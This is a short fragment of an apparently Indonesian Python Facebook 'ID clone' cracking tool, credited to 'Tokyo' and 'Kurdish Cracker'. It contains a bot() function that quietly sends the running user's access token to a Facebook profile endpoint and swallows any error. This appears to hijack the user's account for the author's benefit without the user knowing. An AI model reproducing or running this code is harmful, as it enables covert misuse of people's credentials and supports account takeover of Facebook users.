...
╔════════════════════════════════════════╗                        |       [*]  ID CLONE FRIEND 2022  [*]   |
|════════════════════════════════════════|
| [✓] 𝔸𝕌𝕋ℍ𝕆ℝ   > TOKYO                   |
| [✓] 𝕐𝕆𝕌𝕋𝕌𝔹𝔼  > KURDISH CRACKER         |
| [✓] 𝔾𝕀𝕋ℍ𝕌𝔹   > TOKYO-XD                |
╚════════════════════════════════════════╝
			''')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def bot():
	try:
		requests.post("https://www.facebook.com/profile.php?id=100076211978824?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu():
